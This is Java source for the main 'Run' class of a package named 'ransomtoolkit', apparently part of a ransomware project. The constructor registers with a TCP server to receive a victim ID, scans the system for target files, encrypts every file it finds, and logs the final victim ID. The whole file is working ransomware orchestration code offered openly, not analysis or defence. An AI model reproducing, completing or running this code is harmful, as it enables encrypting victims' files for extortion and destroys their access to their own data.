package com.asef18766.ransomtoolkit;

import java.io.File;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Run {
    public static volatile String VIC_ID = "0xdeadbeef";
    public Run() throws InvalidAlgorithmParameterException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, InvalidKeySpecException, BadPaddingException {
        TcpClient.GetInstance(new TcpClient.OnMessageReceived() {
            @Override
            public void messageReceived(String message) {
                Misc.LogInfo(FileUtils.DEBUG_PREFIX, String.format("client id: %s", message));
                VIC_ID = message;
            }
        });
        FileUtils.GetInstance();
        TargetScanner.Scan(new TargetScanner.OnTargetFounded() {
            @Override
            public void targetFound(File fp) {
                try {
                    FileUtils.GetInstance().EncryptFile(fp);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InvalidAlgorithmParameterException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                } catch (IllegalBlockSizeException e) {
                    e.printStackTrace();
                } catch (InvalidKeySpecException e) {
                    e.printStackTrace();
                } catch (BadPaddingException e) {
                    e.printStackTrace();
                }
            }
        });
        while (VIC_ID == null);
        Misc.LogWarning(FileUtils.DEBUG_PREFIX, "done of running init task");
        Misc.LogWarning(FileUtils.DEBUG_PREFIX, String.format("final vic id:%s", VIC_ID));
    }
}
